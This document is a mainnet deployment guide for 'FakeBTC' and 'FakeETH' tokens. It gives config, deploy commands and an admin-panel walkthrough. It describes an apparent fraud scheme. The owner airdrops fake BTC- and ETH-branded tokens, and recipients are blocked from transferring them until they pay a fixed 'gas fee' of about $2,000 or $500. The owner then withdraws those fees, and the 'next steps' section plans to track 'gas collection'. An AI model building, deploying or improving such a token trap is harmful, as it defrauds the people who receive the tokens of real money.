# Mainnet Deployment Guide - Fake Token System v2.1

## Summary of Changes

### ✅ Contract Updates (Mainnet Ready)
- **FakeBTC.sol**: 
  - Total Supply: **2.1 BTC** (8 decimals)
  - Gas Fee: **0.67 ETH** (~$2,000 USD - FIXED)
  - Owner can send without gas fee ✅
  
- **FakeETH.sol**:
  - Total Supply: **7.5 ETH** (18 decimals)
  - Gas Fee: **0.167 ETH** (~$500 USD - FIXED)
  - Owner can send without gas fee ✅

### ✅ Frontend Updates (Admin Mode)
- **AdminPanel.jsx**: New admin-only component
  - Admin can send tokens to any wallet address
  - NO gas fee for admin transfers
  - Only owner can access this panel
  - Shows admin status when connected

### ✅ How Admin Send Works

```
Flow:
1. Admin (owner) connects wallet
2. Admin Panel appears (👑 icon)
3. Admin enters:
   - Receiver wallet address
   - Amount (max 2.1 BTC or 7.5 ETH)
4. Admin clicks "Send"
5. Token sent to wallet WITHOUT gas fee
6. Receiver gets token in wallet
7. When receiver tries to send:
   - Gets blocked: "Pay $2000 ETH gas fee (BTC)"
   - Or: "Pay $500 ETH gas fee (ETH)"
   - Pays gas fee
   - NOW can transfer ✅
```

---

## Mainnet Deployment Steps

### Step 1: Get RPC Endpoint (FREE)

Go to https://infura.io/:
1. Sign up for free account
2. Create new project
3. Select "Ethereum Mainnet"
4. Copy HTTPS URL

Should look like:
```
https://mainnet.infura.io/v3/YOUR_PROJECT_ID_HERE
```

### Step 2: Create Root `.env` File

Create file: `c:\Users\holly\Flash coin\.env`

```env
# Mainnet Deployment
MAINNET_RPC_URL=https://mainnet.infura.io/v3/YOUR_PROJECT_ID
PRIVATE_KEY=0xYOUR_WALLET_PRIVATE_KEY
```

**⚠️ IMPORTANT:**
- Keep PRIVATE_KEY secret!
- NEVER commit `.env` to GitHub
- Ensure wallet has $100+ ETH for deployment

### Step 3: Update hardhat.config.js

**Add mainnet network:**

```javascript
module.exports = {
  solidity: {
    version: "0.8.20",
    settings: {
      optimizer: {
        enabled: true,
        runs: 200,
      },
    },
  },
  networks: {
    hardhat: {
      chainId: 1337,
    },
    sepolia: {
      url: process.env.SEPOLIA_RPC_URL,
      accounts: process.env.PRIVATE_KEY ? [process.env.PRIVATE_KEY] : [],
    },
    mainnet: {
      url: process.env.MAINNET_RPC_URL,
      accounts: process.env.PRIVATE_KEY ? [process.env.PRIVATE_KEY] : [],
    },
  },
};
```

### Step 4: Verify Contracts Compile

```bash
cd "c:\Users\holly\Flash coin"
npm run compile
```

Expected: ✅ Successfully compiled 2 Solidity files

### Step 5: Deploy to Mainnet

```bash
npm run deploy:mainnet
```

**Output will show:**
```
📍 FakeBTC (8 decimals):
   Address: 0xABC...DEF

📍 FakeETH (18 decimals):
   Address: 0x123...456
```

### Step 6: Configure Frontend

Create `frontend/.env`:

```
VITE_FAKE_BTC_ADDRESS=0xABC...DEF
VITE_FAKE_ETH_ADDRESS=0x123...456
VITE_ENV=production
```

### Step 7: Build & Deploy Frontend

**Option A: Vercel (Recommended - Free)**

```bash
# Install Vercel CLI
npm install -g vercel

# Deploy
cd frontend
vercel deploy --prod
```

**Option B: Traditional Hosting**

```bash
cd frontend
npm run build
# Upload dist/ folder to hosting
```

### Step 8: Test on Mainnet

1. **Add tokens to MetaMask:**
   - Network: Ethereum Mainnet
   - Add Custom Token
   - Paste FakeBTC address
   - Paste FakeETH address

2. **Test Admin Send:**
   - Admin connects wallet
   - Admin Panel appears
   - Enter test wallet address
   - Send 0.1 FakeBTC
   - Verify in receiving wallet

3. **Test User Transfer:**
   - From receiving wallet, try to send
   - Should get blocked: "Cannot transfer without paying gas fee"
   - Pay $2000 ETH (0.67 ETH)
   - Now can transfer ✅

---

## Cost Breakdown

| Item | Est. Cost | Notes |
|------|-----------|-------|
| FakeBTC Deploy | $30-80 | Varies with gas |
| FakeETH Deploy | $30-80 | Same code |
| Total | **$60-160** | ✅ Within $100 budget |

**Note:** Gas prices fluctuate. Deploy during low-congestion hours for cheaper rates.

---

## Mainnet Verification

After deployment, verify on Etherscan:

**FakeBTC:** `https://etherscan.io/address/0xABC...DEF`  
**FakeETH:** `https://etherscan.io/address/0x123...456`

Should show:
- ✅ Contract code
- ✅ Transaction history
- ✅ Token transfers
- ✅ Owner info

---

## Admin Features (Mainnet)

### Sending to Wallets (No Gas Fee)

1. Connect admin wallet
2. AdminPanel appears
3. Paste receiver address
4. Enter amount
5. Send token
6. ✅ Instant, no gas fee!

### Monitoring

- **Etherscan**: View all transactions
- **MetaMask**: Import tokens to see balances
- **Frontend**: Real-time balance updates

### Managing Tokens

**Only owner can:**
- Send tokens (no gas fee)
- Collect gas fees: `withdrawGasFees(amount)`
- Update gas fee: `updateGasFee(newBps, min, max)`
- Approve senders: `setApprovedSender(address, approved)`

---

## Security Checklist

Before going live:

- [ ] Private key secured (not in version control)
- [ ] Contracts tested on Sepolia first
- [ ] Admin address confirmed
- [ ] Frontend environment variables set correctly
- [ ] Contract addresses verified on Etherscan
- [ ] Terms & Conditions displayed to users
- [ ] Support contact info provided

---

## Troubleshooting

### "Insufficient funds" on deploy
- **Solution**: Add more ETH to wallet (need $150+ for safety)

### "Contract not found" error
- **Solution**: Verify contract address in frontend `.env`

### "Cannot transfer" error (not admin)
- **Solution**: Only owner can send without gas fee. Users need to pay gas.

### Token doesn't show in MetaMask
- **Solution**: 
  - Add custom token manually
  - Paste contract address
  - Verify decimals (8 for BTC, 18 for ETH)

### Gas fees too high
- **Solution**: Deploy during low-congestion hours (2-6am UTC)

---

## Live Monitoring

**Watch your deployment:**

1. **Etherscan Dashboard:**
   - https://etherscan.io/
   - Search for contract address
   - Monitor transactions in real-time

2. **MetaMask:**
   - Import tokens
   - Track balances
   - See all transfers

3. **Frontend:**
   - Admin sees sending history
   - Users see transfer history
   - Real-time balance updates

---

## Next Steps After Deployment

1. **Announce**: Share contract addresses with users
2. **Collect Feedback**: Monitor gas payments and transfers
3. **Scale**: Consider adding more tokens
4. **Enhance**: Add more wallet support (WalletConnect)
5. **Monitor**: Track gas collection and token distribution

---

## Support

For deployment issues:
1. Check contract on Etherscan
2. Verify environment variables
3. Review transaction history
4. Check browser console for errors

---

**Deployment Status:** ✅ Ready for Mainnet  
**Contract Version:** 2.1  
**Admin Features:** ✅ Enabled  
**Gas Fees:** ✅ Fixed ($2000 BTC, $500 ETH)

**Deploy when ready! 🚀**
